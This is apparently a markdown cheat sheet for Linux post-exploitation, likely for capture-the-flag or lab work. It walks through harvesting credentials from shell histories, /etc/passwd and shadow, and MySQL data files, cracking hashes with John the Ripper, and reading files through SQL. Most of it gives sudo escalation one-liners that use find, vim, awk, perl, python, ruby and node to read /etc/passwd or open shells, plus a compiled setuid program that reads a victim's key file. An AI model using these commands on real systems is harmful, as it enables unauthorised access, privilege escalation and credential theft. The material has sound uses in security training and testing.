# Bash History

Always check `~/.bash_history` and the equivalent for other shells of all users.

```
find /home -name .bash_history
find /home -name .zsh_history
```

Use more advanced patterns with grep to find matches for specific patterns and lines before/after a match.

```
find . -name .bash_history -exec grep -A 1 '^passwd' {} \;
```

TODO: Lookup filenames for sh, zsh, ksh

# Bash RC

Always check `~/.bashrc` and the equivalent for other shells of all users.

```
find /home -name .bashrc
```

If you are looking for a particular value, use grep to check the contents of each file for a specific PATTERN

```
find /home -name .bashrc -exec grep PATTERN {} \;
```

TODO: Lookup filenames for sh, zsh, ksh

# Find user home paths

Home directories are typically in `/home` but not necessarily.  
Inspect `/etc/passwd` to see where else home directories might be, especially for service accounts.

# Check for left behind files

```
ls -la /tmp
ls -la /var/tmp
```

# File type and contents

Use `file` to detect file type
Use `strings` to see readable text

Extract archives to see this contents
* `bzip2 -dk backup.bz2`
* `tar -xvzf backup.tgz`

# Scheduled jobs

Check for tools like `cronjob`, `anacron`

Check contents of `/etc/cron.daily/`

# Linux Passwords

Legacy passwords may be stored in `/etc/passwd`.  The second part delimited by `:` is the hash.  For example:

* `victim:S3Nnig1pzY90w:18614:0:99999:7:::` which is DES
* if the hash starts by `$1$`, MD5 is used;
* if the hash starts by `$2$` or `$2a$`, Blowfish is used;
* if the hash starts by `$5$`, SHA-256 is used;
* if the hash starts by `$6$`, SHA-512 is used.

If you find an `x` instead of a hash then the hashes are stored in `/etc/shadow` instead.  You will need to run John the Ripper's `unshadow` command.

# Service Accounts

Look for service accounts that have a valid shell instead of `/bin/false`.

# Applications

Web servers usually have files with database connection strings, api keys, or other credentials.  

`/var/www`

For example:

* `/var/www/classes/db.php`

Website administration services may have user databases.  For example:

`/etc/tomcat7/tomcat-users.xml`

# MySQL

Try local mysql login which is often passwordless.  Dump passwords from tables;

`mysql -u root`
`mysql -u root -p`

* `show databases;`
* `use [DATABASE];`
* `show tables;`
* `select * from [TABLE];`

Try getting the root user password from disk.

`strings /var/lib/mysql/mysql/user.MYD`

            localhost
    root*F5F751E2638285EE01E310FB
    6c732c6044b7
    root
            127.0.0.1
    root
    root
            localhost
    debian-sys-maint*D1461CE757B9B67AC344204A3A7FE9F9DB17A35C
    EF91BDDA573A0E1B

The password here requires two parts to be put together `F5F751E2638285EE01E310FB` and `EF91BDDA573A0E1B` to make a password file as follows.  You can then crack this with John the Ripper.

    root:*F5F751E2638285EE01E310FBEF91BDDA573A0E1B

You can also try to read files from disk:

`SELECT LOAD_FILE('/var/lib/mysql-files/key.txt');`

# Postgres

Try logging in as the linux user.  From there anonymous `psql` may be possible.

* `\list` to view databases
* `\c dbname` to use a database
* `\d` to list the tables

You can also try to read files from disk:

`CREATE TABLE demo(t text);`
`COPY demo from '[FILENAME]';`
`SELECT * FROM demo;`

# SQLlite3

Given a database file, you can open it with:
`sqlite3 database.db`

Run `.tables` to see the tables in the database.

# Sudo

`sudo -l` to see what you can do. For example:

    User (remote) may run the following commands on 4b792413416a:

    (target) /bin/bash
    (target2) /usr/bin/find
    (target3) /usr/bin/vim
    (target4) /usr/bin/less
    (target5) /usr/bin/awk
    (target6) /bin/chmod, /bin/cp
    (target7) /usr/bin/perl
    (target8) /usr/bin/python
    (target9) /usr/bin/ruby
    (target10) /usr/local/bin/node

You can then execute that command using:
 `sudo -u target /bin/bash`.

Depending on the application you are allowed to run, there are sensitive files that can be read or priv esc may be possible.  

__Find__

`sudo -u target2 /usr/bin/find /etc/passwd -exec cat {} \;` to read a file, or
`sudo -u target2 /usr/bin/find /etc/passwd -exec /bin/bash \;` to open a shell

__Vim__

`sudo -u target3 /usr/bin/vim` and then either:
* `:r /etc/passwd` to read files
* `:!/bin/bash` to open a shell

__Less__

`sudo -u target4 /usr/bin/less /etc/passwd` to read a file and open less.  Then you can:

* `:e [PATH]` to open a file
* `!/bin/bash` to open a shell

__Awk__

`sudo -u target5 /usr/bin/awk '{print $1}' /etc/passwd` to read a file.

`sudo -u target5 /usr/bin/awk 'BEGIN {system("/bin/bash")}'` to start a shell.

__Setuid & Setgid__

`Setuid` flags on `root` user binaries, or equivalent `setgid` flags, are always a good target.

We need to either find useul binaries that already have these flags, or be able to copy or otherwise create files owned by the target user.  Additionally, we need to be able to set `setgid` or `setuid` flags on them.

Historically, you could exploit this issue by copying a shell (bash, ksh more recently) and adding the `setuid` bit to it. Unfortunately most shells will now prevent this attack. 

We can still do something similar by writing our own program.  

```bash
echo 'int main(void)
{
system("cat /home/victim/key.txt");
}' > /tmp/badfile.c
```

You can compile this with:

```bash
gcc -o /tmp/badfile /tmp/badfile.c
```

Then you will need to copy it using `sudo`.  

```bash
sudo -u target cp /tmp/badfile /tmp/target
```

This will allow you to create a file owned by the victim user. After you copied it, you should be able to set the `executable`, `setuid` and `setgid` flags on it using:

```bash
sudo -u target chmod +xs /tmp/target
```

We can then run the executable normally, but it will run with the target user's profile.

```bash
/tmp/target
```

__Perl__

Run perl code in the context of the target user

```bash
sudo -u target7 /usr/bin/perl -pe 'print $' /etc/passwd
sudo -u target7 /usr/bin/perl -e 'exec "cat /etc/passwd";'
```

Or run a perl REPL

```bash
sudo -u target7 /usr/bin/perl -d -e 1
```

Or even some reverse shells... [link](https://highon.coffee/blog/reverse-shell-cheat-sheet/#perl-reverse-shell)

__Python__

Run Python code in the context of the target user

```bash
sudo -u target8 /usr/bin/python -c 'import sys;[sys.stdout.write(line) for line in open("/etc/passwd")]'
```

Run a Python REPL:

```bash
sudo -u target8 /usr/bin/python
```
```
with open("/etc/passwd") as f:
    print(f.readlines())
```

__Ruby__

Run Ruby code in the context of the target user

```bash
sudo -u target9 /usr/bin/ruby -e 'File.open("/etc/passwd", "r") do |f|
>   f.each_line do |line|
>     puts line
>   end
> end'
```

Run a Ruby REPL"

```bash
sudo -u target9 /usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)'
```
```
File.open("/etc/passwd", "r") do |f|
  f.each_line do |line|
    puts line
  end
end
```

__Node JS__

Run Javascript code in the context of the target user

```bash
sudo -u target10 /usr/local/bin/node -e 'var exec = require("child_process").exec;
exec("cat /etc/passwd", function (error, stdOut, stdErr) {
console.log(stdOut);
});'
```

Start a Node REPL:

```bash
sudo -u target10 /usr/local/bin/node
```
```
var fs = require('fs');
fs.readFile('/etc/passwd', 'utf8', function(e, d) {
  console.log(d);
});
```